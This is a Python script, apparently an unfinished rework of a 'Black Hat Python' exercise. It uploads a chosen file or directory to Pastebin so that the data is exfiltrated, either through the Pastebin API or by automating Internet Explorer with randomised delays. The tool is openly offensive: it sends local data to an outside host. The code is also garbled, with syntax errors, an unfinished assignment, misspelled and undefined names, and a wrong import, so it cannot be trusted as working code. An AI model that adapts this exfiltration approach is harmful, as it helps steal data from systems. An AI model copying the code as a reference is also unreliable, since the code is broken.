#!/usr/bin/python3

#from win32com import client

# import multiprocessing as mp
import threading, os, sys, time, subprocess, logging, argparse, request, random
# from  typing import Any, Awaitable
from dataclasses import  dataclass



@dataclass(slots=True)
class exfiltrator:
    username: str
    password: str
    api_dev_key: str
    title: str
    contents: str
    browser_exec: str
    is_directory: bool
    api_user_key: str # Post-Logon request by this application

    def __init__(self):
        # Check arguments
        args_len = len(args)
        if len(args.username) > 0:
            self.username = arg.username
        else:
            print("Username of invalid length")
            os.exit(1)
        if len(args.password) > 0:
            self.password = arg.password
        else:
            print("Password of invalid length")
            os.exit(1)
        if len(args.api_dev_key) > 0:
            self.api_dev_key = args.api_dev_key
        else:
            print("api_dev_key of invalid length")
            os.exit(1)
        if len(args.title) > 0:
            self.title = title
        else:
            print("Title of invalid length")
            os.exit(1)
        if path.exists(args.contents):
            dir_check = os.path.isdir(contents)
            file_check = os.path.isfile(contents)
            if file_check == True and dir_check != True:
                is_directory = False
                 with open(args.contents, "r") as f:
                     self.contents = f.open()
            else:
                print(f"Error cannot be both Directory and File contents path: {args.contents}")
                exit(1)
            if dir_check == True and file_check != True:
                self.contents = args.contents
                self.is_directory = True
            else:
                print(f"Error cannot be both Directory and File contents path: {args.contents}")
                exit(1)
        else:
            print(f"Error Invalid contents path: {args.contents}")
            exit(1)
        if len(args.browser) > 0:
            if os.path.exists(args.brower):
                self.browser = args.browser
             else:
                print(f"Error Browser executable does not exist or is inaccessible")
                exit(1)
        else:
                print(f"Error Browser string provided by user is 0")
                exit(1)

    def plain_paste(title, contents):
        login_url = 'https://pastebin.com/api/api_login.php'
        login_data = {
        'api_dev_key': self.api_dev_key,
        'api_user_name': self.username,
        'api_user_password': self.password,
        }
        r = requests.post(login_url, data=login_data)
        self.api_user_key = r.text

        paste_data = {
                'api_paste_name': self.title,
                'api_paste_code': self.contents.decode(),
                'api_dev_key': self.api_dev_key,
                'api_user_key': self.api_user_key,
                'api_option': 'paste',
                'api_paste_private': 0,
        }
        r = requests.post(paste_url, data=paste_data)
        print(r.status_code)
        print(r.text)

    def wait_for_browser(self.browser):
        while self.browser.ReadyState != 4 and self.browser.ReadyState != 'complete':
            time.sleep(0.1)

    def random_sleep():
        time.sleep(random.randint(5,10)

    def login(ie):
        full_doc = ie.Document.all
        for elem in full_doc:
            if elem.id == 'loginform-username':
                elem.setAttribute('value', self.username)
            elif elem.id == 'loginform-pasword':
                        elem.setAttribute('value', self.password)

        random_sleep()
        if ie.Document.forms[0].id == 'w0':
            ie.document.forms[0].submit()
        wait_for_browswer(ie)

    def submit(ie, title, contents):
        full_doc = ie.Document.all
        for elem in full_doc:
            if elem.id == 'postform-name':
                elem.setAttribute('value', title)
            elif elem.id == 'postform-text':
                elm.setAttribute('value', contents)
            
            if ie.Document.forms[0].id == 'w0':
                ie.document,.forms[0].submit()
            random_sleep()
            wait_for_browser(ie)

    def ie_paste(title, contents):
        ie = client.Dispatch(self.browser)
        ie.Visible = 1

        ie.Navigate('https://pastebin.com/login')
        wait_for_broswer(ie)
        login(ie)

        if is_directory != True:
            ie.Navigate('https://pastebin.com/')
            wait_for_browswer(ie)
            submit(ie, self.title, self.contents.decode())
        else: 
            # Recursive Directory scrapping 
            # Collect names of all file in an array as distinct paths 

            filenum = 
            # for probably an enumerate is better                         
            # Read each file and set to self.contents
            # Update_title
                
                self.title.append(f"-{filenum}")
                ie.Navigate('https://pastebin.com/')
                wait_for_browswer(ie)
                submit(ie, self.title, self.contents.decode())


        ie.Quit()

    

if __name__ == '__main__':
    parser = argparse.ArgumentParser(#prog='exfiltopastebin.py', 
                                    usage='%(prog)s -u username -p password -k api_key -t title -c filepath', 
                                    description='Black Hat Python Refactoring of Paste_Exfil.py',
                                    epilog='Happy Hacking :)',
                                    add_help=True,)

    parser.add_argument('-u',
                        metavar='username', 
                        action='store', 
                        type=str, 
                        required=True, 
                        help='Pastebin Username')
 
    parser.add_argument('-p',
                        metavar='password', 
                        action='store', 
                        type=str, 
                        required=True, 
                        help='Pastebin Username')
    
    parser.add_argument('-k', 
                        metavar='api_dev_key', 
                        action='store', 
                        type=str, 
                        required=True, 
                        help='The Pastebin API Key')
    
    parser.add_argument('-t', 
                        metavar='title', 
                        action='store', 
                        type=str, 
                        required=True, 
                        help='The Pastebin Title')
    
    parser.add_argument('-c', 
                        metavar='contents', 
                        action='store', 
                        type=str, 
                        required=True, 
                        help='A file or directory path to be exfiltrated')
    
    parser.add_argument('-b', 
                        metavar='browser_exec', 
                        action='store', 
                        type=str, 
                        required=True, 
                        help='Browser executable')

    args = parser.parse_args()

    exfil = exfiltrator




    ie_paste('title', 'contents')

